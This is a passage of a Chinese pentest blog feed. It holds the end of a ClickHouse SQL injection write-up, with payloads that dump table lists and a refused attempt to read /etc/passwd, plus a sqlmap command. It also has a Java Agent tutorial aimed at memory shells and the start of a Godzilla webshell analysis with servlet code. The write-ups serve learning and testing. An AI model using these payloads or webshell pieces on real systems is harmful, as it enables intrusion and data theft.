currentDatabase()) and (&#39;</code></li><li><code>&#39;) and ((select * from (select arrayStringConcat(*)from system.tables )a)) and (&#39;&quot;</code></li><li><code>&quot;&#39;) and ((select * from (select arrayStringConcat(*)from system.databases )a)) and (&#39;&quot;</code></li></ul><p>以下操作显示无权限：</p><ul><li><code>&#39;) and (select * from url(&#39;&lt;ip&gt;&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li><li><code>&#39;) and (select * from file(&#39;/etc/passwd&#39;, CSV, &#39;column1 String, column2 UInt32&#39;)) and (&#39;</code></li></ul><h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><ul><li>能否利用Clickhouse的<code>JDBC</code>进行JNDI注入</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.deteact.com/yandex-clickhouse-injection/">Yandex.ClickHouse injection</a></li><li><a href="https://johnfrod.top/ctf/bytectf-2021double-sqli/">ByteCTF 2021 double sqli</a></li><li><a href="https://clickhouse.com/docs/zh/sql-reference/table-functions/url/">https://clickhouse.com</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前期尝试&quot;&gt;&lt;a href=&quot;#前期尝试&quot; class=&quot;headerlink&quot; title=&quot;前期尝试&quot;&gt;&lt;/a&gt;前期尝试&lt;/h2&gt;&lt;p&gt;根据源代码发现可以利用&lt;code&gt;&amp;#39;)&lt;/code&gt;拼接闭合SQL语句之后，插入要注入的Payload，比如：&lt;code&gt;1&amp;#39;)and sleep(3) and (&amp;#39;1&lt;/code&gt;，可以休眠3S。经过测试发现存在以下限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sleep的时间不能超过3秒，超过之后造成请求查询超时，会立刻返回&lt;/li&gt;
&lt;li&gt;sleep关键词不能使用大写，因为clickhouse函数大小写敏感&lt;/li&gt;
&lt;li&gt;无法使用sqlmap跑数据，因为sqlmap不支持clickhouse数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;虽然Sqlmap不支持ClickHouse，但是我还是不死心的跑了一下，&lt;del&gt;可能这就是脚本小子吧&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;经过我不懈努力，终于让Sqlmap跑出来了可注入点:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;./sqlmap.py -r ~/Desktop/sql.txt -v --technique&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;T --level &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; -v &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; --dbms MySQL --time-sec &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; --prefix &lt;span class=&quot;token string&quot;&gt;&quot;&#39;)&quot;&lt;/span&gt; --suffix &lt;span class=&quot;token string&quot;&gt;&quot;and (&#39;&quot;&lt;/span&gt; --tamper lowercase --proxy http://127.0.0.1:8080&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/2022/10/27/clickhouse-sql-inject/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了让Sqlmap跑出来这个注入点，一言难尽。因为sqlmap里面的&lt;code&gt;SLEEP(5)&lt;/code&gt;是自带的payload，就算是加了&lt;code&gt;--tamper lowercase&lt;/code&gt;也不会改变这个关键payload的大小写，始终是大写。所以我当时有两个选择：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;写个Burp插件转变成小写–费时费力&lt;/li&gt;
&lt;li&gt;修改Sqlmap的源代码–这个简单&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;于是乎，我直接编辑sqlmap目录下的&lt;code&gt;data/xml/payloads/time_blind.xml&lt;/code&gt;，直接把&lt;code&gt;SLEEP&lt;/code&gt;替换为&lt;code&gt;sleep&lt;/code&gt;，然后发现会影响&lt;code&gt;SLEEPTIME&lt;/code&gt;这个变量，再替换一次&lt;code&gt;sleepTime&lt;/code&gt;为&lt;code&gt;SLEEPTIME&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全笔记(4)-Java Agent</title>
    <link href="https://jkme.github.io/2022/06/23/java-agent-shell.html"/>
    <id>https://jkme.github.io/2022/06/23/java-agent-shell.html</id>
    <published>2022-06-22T16:00:00.000Z</published>
    <updated>2022-11-14T01:50:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="学习背景"><a href="#学习背景" class="headerlink" title="学习背景"></a>学习背景</h2><p><img src="/2022/06/23/java-agent-shell/1.png"></p><ol><li>Agent本来就在学习的清单上</li><li>更深入理解下草师傅说的代理模式</li><li>study the world</li></ol><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><p>AOP为Aspect Oriented Programming的缩写，意为: 面向切面编程，在运行时，动态地将代码切入到类的指定方法、指定位置上的编程思想就是面向切面的编程。<br>以下引用来自su18和天下大木头师傅的博客：</p><blockquote><p>JDK 1.5 开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。</p></blockquote><blockquote><p>开发者可以在一个普通Java程序（带有main函数的Java类）运行时，通过<code>–javaagent</code>参数指定一个特定的jar文件(包含Instrumentation代理)来启动Instrumentation的代理程序。在类的字节码载入jvm前会调用ClassFileTransformer的transform方法，从而实现修改原类方法的功能，实现AOP。</p></blockquote><p>通过java.lang.instrument实现的工具我们称之为Java Agent，Java Agent能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法，Agent内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。</p><p>说白了Java Agent只是一个Java类而已，只不过普通的Java类是以main函数作为入口点的，Java Agent的入口点则是premain和agentmain</p><p>Java Agent 支持两种方式进行加载：</p><ul><li>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</li><li>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</li></ul><h2 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h2><p>首先创建一个premain的agent:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>agentArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"premain method is invoked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后通过mvn或者mf文件打生成jar包：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Premain</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">DemoTest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用javac生成class文件之后打包：<code>jar cvfm agent.jar agent.mf DemoTest.class</code></p><p>然后再创建一个普通的类<code>Hello.java</code>和mf文件:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mf文件:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Main</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">Hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同样打包为jar: <code>jar cvfm hello.jar hello.mf Hello.class</code></p><p>接下来运行的时候增加-javaagent:agent.jar: <code>java -javaagent:agent.jar=Hello -jar hello.jar</code><br><img src="/2022/06/23/java-agent-shell/2.png"></p><h2 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h2><p>首先对这种方式有一个初步的认识，需要三个文件：</p><h4 id="App-java"><a href="#App-java" class="headerlink" title="App.java"></a>App.java</h4><p>循环输出，模拟运行的应用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">ManagementFactory</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> pid <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Pid is:"</span> <span class="token operator">+</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">500</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App is Running!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AgentDemo-java"><a href="#AgentDemo-java" class="headerlink" title="AgentDemo.java"></a>AgentDemo.java</h4><p>实现<code>agentmain</code>功能，用于agent的功能实现</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Surprise! I'm Agent Smith"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Inject-java"><a href="#Inject-java" class="headerlink" title="Inject.java"></a>Inject.java</h4><p>通过VirtualMachine的<code>loadAgent</code>方式，把Agent注入正在运行的App里：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">VirtualMachine</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> pid <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> jarName <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">VirtualMachine</span> vm <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>jarName<span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上三个java文件通过IDEA打包为Jar文件，首先运行App.jar：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp JavaAgentDemo.jar agentmain.demo1.App<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用Inject.jar注入进程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp JavaAgentDemo.jar agentmain.demo1.Inject <span class="token number">22932</span> /var/tmp/AgentDemo.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到App.jar的输出被动态的改变了：<br><img src="/2022/06/23/java-agent-shell/3.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="http://wjlshare.com/archives/1582">浅谈Java Agent内存马</a></li><li><a href="https://su18.org/post/irP0RsYK1/">Java Instrumentation</a></li><li><a href="https://developer.aliyun.com/article/857055">偷天换日，用JavaAgent欺骗你的JVM</a></li><li><a href="https://y4er.com/post/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></li><li><a href="https://www.freebuf.com/articles/web/323621.html">擅长捉弄的内存马同学：Agent内存马（低卡)</a></li><li><a href="https://xz.aliyun.com/t/9450">Java Agent从入门到内存马</a></li><li><a href="https://www.cnblogs.com/wh4am1/p/15996108.html">瞒天过海计之Tomcat隐藏内存马</a></li><li><a href="https://mp.weixin.qq.com/s/OLNznd14NlzEzeGelRLV9g">Java安全-记一次实战使用memoryshell</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;学习背景&quot;&gt;&lt;a href=&quot;#学习背景&quot; class=&quot;headerlink&quot; title=&quot;学习背景&quot;&gt;&lt;/a&gt;学习背景&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2022/06/23/java-agent-shell/1.png&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Agent本来就在学习的清单上&lt;/li&gt;
&lt;li&gt;更深入理解下草师傅说的代理模式&lt;/li&gt;
&lt;li&gt;study the world&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;AOP&quot;&gt;&lt;a href=&quot;#AOP&quot; class=&quot;headerlink&quot; title=&quot;AOP&quot;&gt;&lt;/a&gt;AOP&lt;/h2&gt;&lt;p&gt;AOP为Aspect Oriented Programming的缩写，意为: 面向切面编程，在运行时，动态地将代码切入到类的指定方法、指定位置上的编程思想就是面向切面的编程。&lt;br&gt;以下引用来自su18和天下大木头师傅的博客：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JDK 1.5 开始，Java新增了Instrumentation(Java Agent API)和JVMTI(JVM Tool Interface)功能，允许JVM在加载某个class文件之前对其字节码进行修改，同时也支持对已加载的class(类字节码)进行重新加载(Retransform)。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;开发者可以在一个普通Java程序（带有main函数的Java类）运行时，通过&lt;code&gt;–javaagent&lt;/code&gt;参数指定一个特定的jar文件(包含Instrumentation代理)来启动Instrumentation的代理程序。在类的字节码载入jvm前会调用ClassFileTransformer的transform方法，从而实现修改原类方法的功能，实现AOP。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通过java.lang.instrument实现的工具我们称之为Java Agent，Java Agent能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法，Agent内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去。&lt;/p&gt;
&lt;p&gt;说白了Java Agent只是一个Java类而已，只不过普通的Java类是以main函数作为入口点的，Java Agent的入口点则是premain和agentmain&lt;/p&gt;
&lt;p&gt;Java Agent 支持两种方式进行加载：&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>哥斯拉原理分析</title>
    <link href="https://jkme.github.io/2022/05/17/godzilla.html"/>
    <id>https://jkme.github.io/2022/05/17/godzilla.html</id>
    <published>2022-05-16T16:00:00.000Z</published>
    <updated>2022-05-23T07:48:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析背景"><a href="#分析背景" class="headerlink" title="分析背景"></a>分析背景</h2><p>起源于<code>Y4er</code>师傅发的两篇文章：</p><ul><li><a href="https://tttang.com/archive/1513/">Java反序列化注入冰蝎内存马相关踩坑笔记</a></li><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题</a></li></ul><p>对其中的原因比较好奇，所以尝试对哥斯拉做了一次原理分析，测试代码在<a href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>。文章可能有错误的地方，可以在<a href="https://github.com/JKme/JKme.github.io/issues">issue</a>留言。</p><h2 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h2><p>从哥斯拉的源代码里面扣出来<code>godzilla\shells\payloads\java\assets\payload.classs</code>文件，使用<a href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>反编译之后，在idea里面新建<code>payload.java</code>文件，然后修改误报错，<a href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">这里</a>是反编译好之后的文件。<code>payload.java</code>实现了大部分的shell操作，比如查看文件、执行命令、数据库连接等等</p><p>新建一个<code>HelloServlet.java</code>，用于动态调试：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//定义AES加解密的Key，哥斯拉会把返回的response也做一次加密</span>    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>           <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//用于返回response在头和尾部插入标识符，头部取md5的前16位字符串，尾部取md5的后16位字符串</span>    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                